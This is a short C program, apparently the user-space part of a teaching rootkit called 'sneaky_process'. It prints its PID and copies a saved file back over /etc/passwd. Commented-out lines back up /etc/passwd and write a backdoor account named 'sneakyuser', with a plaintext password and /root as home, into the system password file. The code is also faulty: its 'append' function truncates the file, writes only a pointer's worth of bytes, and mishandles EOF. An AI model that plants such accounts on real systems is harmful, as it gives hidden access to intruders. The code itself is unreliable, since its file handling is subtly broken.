#include <stdlib.h>
#include <unistd.h>
#include <linux/module.h>
#include <stdio.h>
#include <string.h>

// copy content in file1 into file2
void cpFile(const char * file1, const char * file2) {
	FILE * f1 = fopen(file1, "r");
	FILE * f2 = fopen(file2, "w");
	if(f1 == NULL || f2 == NULL) {
		printf("File open failed\n");
		exit(1);
	}
	char cnt;
	while((cnt = fgetc(f1)) != EOF) {
		fputc(cnt, f2);
	}
	printf("Succesfully copy\n");
	fclose(f1);
	fclose(f2);
}

// append extra line to file
void appendFile(const char * fileName, const char * cnt) {
	FILE * f1 = fopen(fileName, "w");
	if(f1 == NULL) {
		printf("File open failed in appendFile\n");
		exit(1);
	}
	printf("before fwrite\n");
	fwrite(cnt, sizeof(char), sizeof(cnt)/sizeof(char), f1);
	fclose(f1);
	printf("Succesfully append\n");
}

int main() {
	// print own process ID
	printf("sneaky_process pid = %d\n", getpid());

	// copy from /etc/passwd to /tmp/passwd
	// cpFile("/etc/passwd", "/tmp/passwd");
	// appendFile("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
	cpFile("/tmp/passwd", "/etc/passwd");

	return 0;
}